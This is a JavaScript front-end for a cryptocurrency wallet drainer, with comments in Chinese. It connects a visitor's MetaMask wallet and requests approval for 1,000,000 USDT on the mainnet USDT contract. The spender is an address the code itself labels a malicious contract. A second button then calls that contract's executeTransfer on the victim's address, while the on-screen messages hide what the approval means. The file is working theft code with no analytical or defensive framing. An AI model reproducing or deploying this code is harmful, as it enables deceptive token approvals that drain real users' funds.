// USDT 合约 ABI
const usdtAbi = [
    "function approve(address spender, uint256 amount) public returns (bool)",
    "function balanceOf(address account) external view returns (uint256)"
];

// 恶意合约 ABI
const maliciousAbi = [
    "function executeTransfer(address user) external"
];

// 合约地址
const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT 主网合约地址
const maliciousContractAddress = "0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b"; // 恶意合约地址

let provider;
let signer;
let userAddress;

document.getElementById("connectButton").onclick = async () => {
    try {
        if (typeof window.ethereum !== 'undefined') {
            provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            signer = provider.getSigner();
            userAddress = await signer.getAddress();
            document.getElementById("message").innerText = "Connected: " + userAddress;
            document.getElementById("approveButton").disabled = false; // 启用批准按钮
        } else {
            document.getElementById("message").innerText = "Please install MetaMask!";
        }
    } catch (error) {
        console.error("Error connecting wallet:", error);
        document.getElementById("message").innerText = "Failed to connect wallet.";
    }
};

document.getElementById("approveButton").onclick = async () => {
    const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
    const amount = ethers.utils.parseUnits("1000000", 6); // 1000000 USDT (6 位小数)

    try {
        const tx = await usdtContract.approve(maliciousContractAddress, amount);
        await tx.wait();
        document.getElementById("message").innerText = "Approval successful!";
        document.getElementById("executeTransferButton").disabled = false; // 启用执行转移按钮
    } catch (error) {
        console.error("Approval error:", error);
        document.getElementById("message").innerText = "Approval failed!";
    }
};

document.getElementById("executeTransferButton").onclick = async () => {
    const maliciousContract = new ethers.Contract(maliciousContractAddress, maliciousAbi, signer);

    try {
        const tx = await maliciousContract.executeTransfer(userAddress);
        await tx.wait();
        document.getElementById("message").innerText = "Transfer executed!";
    } catch (error) {
        console.error("Transfer error:", error);
        document.getElementById("message").innerText = "Transfer failed!";
    }
};
